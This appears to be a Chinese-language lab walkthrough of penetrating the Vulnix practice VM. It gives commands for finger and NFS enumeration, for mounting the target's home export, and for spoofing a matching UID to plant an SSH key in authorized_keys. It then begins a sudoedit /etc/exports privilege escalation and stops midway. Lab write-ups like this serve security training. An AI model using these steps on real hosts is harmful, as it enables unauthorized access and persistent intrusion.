3.1 服务渗透

1.测试SSH服务

2.测试finger服务

finger @192.168.207.138

finger user@192.168.207.138

3.查看NFS服务

showmount -e 192.168.207.138

4.挂载NFS服务

mount -t nfs 192.168.207.138:/home /tmp

3.2 系统渗透

1.登录主机

ssh user@192.168.207.138

2.查看主机内核版本

uname -a
sudo -l

3.查看用户信息

4.挂载目录

mkdir /mnt/vulnix
mount 192.168.207.138:/home/vulnix /mnt/vulnix

5.创建相同权限用户

useradd -u 2008 vulnix
su vulnix

5.创建SSH密钥

ssh-keygen

6.复制内容到/tmp

cp /root/.ssh/id_rsa.pub /opt
chown vulnix:vulnix /opt/id_rsa.pub

7.切换用户保存密钥

mkdir /mnt/vulnix/.ssh
cat /opt/id_rsa.pub >> /mnt/vulnix/.ssh/authorized_keys

8.登录账号

ssh vulnix@192.168.207.138

3.2 权限提升

1.查看sudo权限

sudo -l

2.执行权限命令查看

sudoedit /etc/exports

3.重启虚拟机并重新挂载
